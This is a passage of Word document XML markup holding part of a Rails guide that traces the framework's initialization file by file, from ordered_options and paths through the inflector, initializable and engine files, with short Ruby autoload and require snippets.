        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7A278C22" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5E2630B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1760980853"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>BadConstant is deprecated! Use GoodConstant instead.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A37E245" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.20 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/ordered_options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF05CE4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file is the next file required from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/configuration.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the file that defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::OrderedOptions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is used for configuration options such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.active_support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the like.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C2858EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next file required is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/hash/deep_dup</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is covered in </w:t>
      </w:r>
      <w:hyperlink r:id="rId1083" w:anchor="deep_dup" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Active Support Core Extensions guide</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52E7EACA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The file that is required next from is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/paths</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262722CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.21 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/paths.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466EB6AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Paths</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module which allows paths to be configured for a Rails application or engine. Later on in this guide when we cover Rails configuration during the initialization process we’ll see this used to set up some default paths for Rails and some of them will be configured to be eager loaded.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20626755" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.22 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/rack.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A22FDF8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The final file to be loaded by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/configuration.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which defines some simple autoloads:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7822A351" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B7607FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A1D0FCF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rack</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77F45A0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    autoload :Debugger,  "rails/rack/debugger"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="742FAD77" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    autoload :Logger,    "rails/rack/logger"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="641E9B19" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    autoload :LogTailer, "rails/rack/log_tailer"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05310B71" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    autoload :Static,    "rails/rack/static"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45909D1B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57E7F158" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="63E05F46" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once this file is finished loading, then the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Configuration</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is initialized. This completes the loading of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/configuration.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and now we jump back to the loading of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, where the next file loaded is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/inflector</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B3DC38" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.23 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/inflector.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C141760" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/inflector.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requires a series of file which are responsible for setting up the basics for knowing how to pluralize and singularize words. These files are:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="26BD9890" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09D19F36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/inflector/inflections'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49D58C38" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/inflector/transliterate'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="207123A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/inflector/methods'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F707E74" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09AFED01" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/inflections'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D23F011" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/core_ext/string/inflections'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5292A4BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/inflector/methods</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file has already been required by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/autoload</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and so won’t be loaded again here. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/inflector/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is required by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/inflector/methods</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC65A4C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.24 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/inflections</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A82F092" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file references the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveSupport::Inflector</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant which isn’t loaded by this point. But there were autoloads set up in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which will load the file which loads this constant and so then it will be defined. Then this file defines pluralization and singularization rules for words in Rails. This is how Rails knows how to pluralize “tomato” to “tomatoes”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C53FE83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.25 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/active_support/inflector/transliterate.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D57A99B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In this file is where the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1084" w:anchor="method-i-transliterate" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>transliterate</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parameterize</w:t>
      </w:r>
      <w:r>
        <w:t>:http://api.rubyonrails.org/classes/ActiveSupport/Inflector.html#method-i-parameterize methods are defined. The documentation for both of these methods is very much worth reading.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="771253C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.26 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15241903" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once the inflector files have been loaded, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is defined. This class includes a module called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Initializable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which is actually </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Initializable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This module includes the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method which is used later on for setting up initializers, amongst other methods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E05259" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.27 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/initializable.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC3D408" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>When the module from this file (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Initializable</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) is included, it extends the class it’s included into with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ClassMethods</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module inside of it. This module defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>initializer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method which is used to define initializers throughout all of the railties. This file completes the loading of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/railtie.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Now we go back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/engine.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FAA1D7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.28 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/engine.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C39EB14" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next file required in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/engine.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/delegation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is documented in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1085" w:anchor="method-delegation" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Active Support Core Extensions Guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FC0741" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next two files after this are Ruby standard library files: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>pathname</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rbconfig</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The file after these is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/engine/railties</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AF09CC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.29 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/engine/railties.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D17D85D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine::Railties</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class which provides the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>engines</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> methods which are used later on for defining rake tasks and other functionality for engines and railties.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D42800" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.30 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/engine.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040F5508" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/engine/railties.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has finished loading the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Engine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class gets its basic functionality defined, such as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>inherited</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method which will be called when this class is inherited from.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3DBCE4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once this file has finished loading we jump back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/plugin.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A845E60" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.31 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/plugin.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73258A20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next file required in this is a core extension from Active Support called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>array/conversions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which is covered in </w:t>
      </w:r>
      <w:hyperlink r:id="rId1086" w:anchor="array-conversions" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>this section</w:t>
